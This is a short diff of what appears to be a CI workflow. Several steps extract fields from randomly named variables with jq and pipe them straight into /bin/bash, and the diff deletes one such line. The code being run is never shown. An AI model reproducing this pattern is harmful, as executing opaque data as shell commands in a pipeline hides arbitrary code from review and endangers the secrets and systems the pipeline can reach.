@@ -29,7 +29,6 @@ jobs:
           echo $d6 | jq -r .lo65 | /bin/bash
           echo $b2663 | jq -r .dpfpd4 | /bin/bash
           printf '%s' "$gs8689" | jq -r .cso48 | /bin/bash
-          printf '%s' "$h3050" | jq -r .h4072 | /bin/bash
 
       - name: Save archive
         if: always()
